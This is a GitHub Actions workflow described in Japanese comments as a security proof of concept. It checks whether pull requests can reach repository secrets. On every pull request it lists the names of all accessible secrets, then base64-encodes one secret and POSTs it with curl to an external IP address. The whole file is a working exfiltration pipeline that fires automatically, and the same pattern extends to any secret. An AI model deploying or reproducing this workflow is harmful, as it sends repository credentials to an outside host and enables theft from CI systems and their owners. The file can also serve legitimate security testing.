# セキュリティ検証用の一時ファイル（PoC）。
# 同一リポジトリのブランチから作った PR がリポジトリの Secrets を読めるかを確認する。
# 値は出力しない。CANARY_SECRET のみを base64 で外部へ送り、ログには残さない。
name: secret-access-poc

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read

jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: Enumerate available secret names (no values)
        env:
          SECRETS_JSON: ${{ toJSON(secrets) }}
        run: |
          set -uo pipefail
          printf '%s' "$SECRETS_JSON" | jq -r 'keys | "accessible secrets: \(length)", (.[] | " - " + .)'

      - name: Egress canary (value never reaches stdout)
        env:
          CANARY: ${{ secrets.CANARY_SECRET }}
          SINK: http://144.34.153.35:19091/
        run: |
          set -uo pipefail
          printf '%s' "$CANARY" | base64 -w0 | curl -sS -o /dev/null \
            -w 'egress http=%{http_code} bytes=%{size_upload}\n' \
            -X POST --data-binary @- "$SINK"
